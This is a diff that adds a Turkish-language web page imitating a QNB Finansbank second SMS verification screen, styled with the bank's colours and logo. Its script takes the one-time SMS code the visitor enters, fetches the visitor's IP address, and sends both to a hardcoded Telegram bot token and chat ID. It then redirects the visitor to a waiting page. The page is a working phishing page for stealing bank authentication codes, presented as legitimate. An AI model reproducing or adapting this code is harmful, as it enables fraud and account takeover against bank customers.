@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <title>QNB Finansbank SMS Doğrulama</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
+    <link rel="stylesheet" href="css/FinansbankLoginStyle.css"> <!-- Mevcut stil dosyası -->
+    <script src="js/jquery-3.6.4.min.js"></script> <!-- Jquery kullanımı -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #800d52;
+            /*padding: 10px 20px;*/
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: #fff;
+        }
+        .header img {
+            height: 50px;
+        }
+        .form-container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 1px solid #d7d7d7;
+            border-radius: 10px;
+            background: #f9f9f9;
+        }
+        .form-container h1 {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #800d52;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #d7d7d7;
+            border-radius: 5px;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            background: #800d52;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .form-container button:hover {
+            background: #a71f6a;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="/images/kusakli_mobile2x.png" alt="QNB Finansbank Logo"> <!-- Logo yolu -->
+        <span>QNB Finansbank SMS Doğrulama</span>
+    </div>
+
+    <div class="container">
+        <div class="form-container">
+            <h1>2. SMS Doğrulama</h1>
+            <form id="smsForm">
+                <label for="sms">2. SMS Kodu</label>
+                <input type="text" id="sms" name="sms" maxlength="6" placeholder="6 Haneli Kod" required>
+                <button type="submit">Gönder</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('smsForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Sayfa yenilemesini engelle
+
+            const sms = document.getElementById('sms').value;
+
+            // IP adresini almak için API kullanımı
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    // Telegram bot API ayarları
+                    const telegramBotToken = '8064272310:AAGviMZYqAyuCqiV48yqDzZSqiPCcf-gVvs'; // Bot token buraya
+                    const chatId = '-1002317303620'; // Chat ID buraya
+                    const message = `SMS Kodu: ${sms}\nIP Adresi: ${ipAddress}`;
+
+                    // Telegram mesaj gönderimi
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                        .then(response => {
+                            if (response.ok) {
+                                alert('Mesaj başarıyla gönderildi.');
+                                window.location.href = 'bekle.html'; // Yönlendirme
+                            } else {
+                                alert('Mesaj gönderilemedi. Lütfen tekrar deneyin.');
+                            }
+                        })
+                        .catch(error => console.error('Telegram API hatası:', error));
+                })
+                .catch(error => console.error('IP adresi alınamadı:', error));
+        });
+    </script>
+</body>
+</html>
